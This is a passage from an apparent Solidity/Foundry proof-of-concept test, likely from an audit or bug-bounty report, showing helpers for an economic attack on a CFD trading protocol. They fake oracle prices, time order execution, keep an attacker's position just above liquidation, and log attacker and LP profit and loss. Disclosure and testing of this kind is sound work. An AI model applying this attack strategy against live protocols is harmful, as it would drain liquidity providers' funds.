        o.keeperNet = int256(clearinghouse.balanceAssets(KEEPER)) - int256(keeperBefore);
        // Closed system: attacker + LPs + treasury + independent keeper sum to zero.
        assertEq(o.attackerNet + o.lpNet + o.treasuryNet + o.keeperNet, 0, "conservation");
    }

    // ------------------------------------------------------------------ helpers

    function _go(
        uint256 t
    ) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _payload(
        uint256 price,
        uint64 publishTime,
        uint64 prevPublishTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            u[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, int32(-8), publishTime, prevPublishTime)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _tick(
        uint256 price,
        uint64 publishTime,
        uint64 prevPublishTime
    ) internal returns (bytes[] memory data) {
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), uint256(publishTime));
        data = _payload(price, publishTime, prevPublishTime);
    }

    function _refresh(
        uint256 price
    ) internal {
        uint64 t = uint64(vm.getBlockTimestamp());
        bytes[] memory d = _tick(price, t, t - 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

    /// @dev Uses the production V3 commitment selector, bypassing the harness's historical scalar adapter.
    function _orderRequest(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(block.timestamp + router.maxExecutionWindowSeconds());
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _openLeg(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        OrderV3Types.OrderRequest memory request = _orderRequest(side, size, margin, false);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        uint64 c = uint64(vm.getBlockTimestamp());
        _go(c + 1);
        bytes[] memory px = _tick(1e8, c + 1, c); // built before the prank (setAllPrices is a call)
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, px);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
    }

    function _closeLeg(
        address account,
        CfdTypes.Side side,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _orderRequest(side, LEG, 0, true);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        uint64 cc = uint64(vm.getBlockTimestamp());
        _go(cc + 1);
        bytes[] memory px = _tick(price, cc + 1, cc); // built before the prank (setAllPrices is a call)
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, px);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");
    }

    /// @dev Frozen liquidation price for `side` (mark +/- 10 bp basket confidence x 25% adverse multiplier).
    function _liqPrice(
        CfdTypes.Side side
    ) internal view returns (uint256) {
        uint256 mark = engine.lastMarkPrice();
        uint256 shift = (mark * 10 / 10_000) * 2500 / 10_000;
        return side == CfdTypes.Side.LONG ? mark + shift : mark - shift;
    }

    function _req(
        address account,
        uint256 price
    ) internal view returns (uint256) {
        (uint256 size,,,,,,) = engine.positions(account);
        return (size / 1e20) * price * 300 / 10_000;
    }

    function _liquidatable(
        address account,
        CfdTypes.Side side
    ) internal view returns (bool) {
        return engineLens.isLiquidatableAt(account, _liqPrice(side), pool.totalAssets());
    }

    /// @dev Live FAD-lead liquidation check (MockPyth live ticks carry zero confidence in this harness).
    function _liveLiquidatable(
        address account,
        uint256 price
    ) internal view returns (bool) {
        return engineLens.isLiquidatableAt(account, price, pool.totalAssets());
    }

    /// @dev Attacker keep-alive during the live FAD lead: top up to live boundary + CUSHION if below it.
    function _keepAliveLive(
        address account,
        uint256 price
    ) internal {
        int256 equity = engineLens.previewLiquidation(account, price).equityAssets;
        int256 target = int256(_req(account, price) + CUSHION);
        if (equity < target) {
            vm.prank(account);
            engine.addMargin(account, uint256(target - equity));
        }
    }

    /// @dev Carry an account will pay between `fromTs` and `toTs` at the frozen liquidation price (state snapshot).
    function _carryBetween(
        address account,
        CfdTypes.Side side,
        uint256 fromTs,
        uint256 toTs
    ) internal returns (uint256) {
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 nowBlock = vm.getBlockNumber();
        uint256 snap = vm.snapshotState();
        vm.warp(fromTs);
        int256 e0 = engineLens.previewLiquidation(account, _liqPrice(side)).equityAssets;
        vm.warp(toTs);
        int256 e1 = engineLens.previewLiquidation(account, _liqPrice(side)).equityAssets;
        vm.revertToState(snap);
        vm.warp(nowTs);
        vm.roll(nowBlock);
        return e0 > e1 ? uint256(e0 - e1) : 0;
    }

    function _log(
        string memory tag,
        Outcome memory o
    ) internal pure {
        console2.log(tag);
        console2.log("    loser exit cost (USDG atoms)       ", o.loserExitCost);
        console2.log("    loser exit cost (bp of 4M notional)", o.loserExitCost * 10_000 / 4_000_000e6);
        if (o.minutesToCross != 0) {
            console2.log("    minutes after decision to frozen exit", o.minutesToCross);
        }
        console2.log("    attacker net (USDG atoms, signed)  ", o.attackerNet);
        console2.log("    LP net (pool assets, signed)       ", o.lpNet);
        console2.log("    protocol treasury net (signed)     ", o.treasuryNet);
        console2.log("    independent keeper net (signed)    ", o.keeperNet);
    }

}
```

## Fork check

Supplementary [deployed-release fork source](https://gist.github.com/tinnohofficial/d26ee4cf398664b11aeb7ed9ca80ef26): **6/6 twice**, with MockPyth.

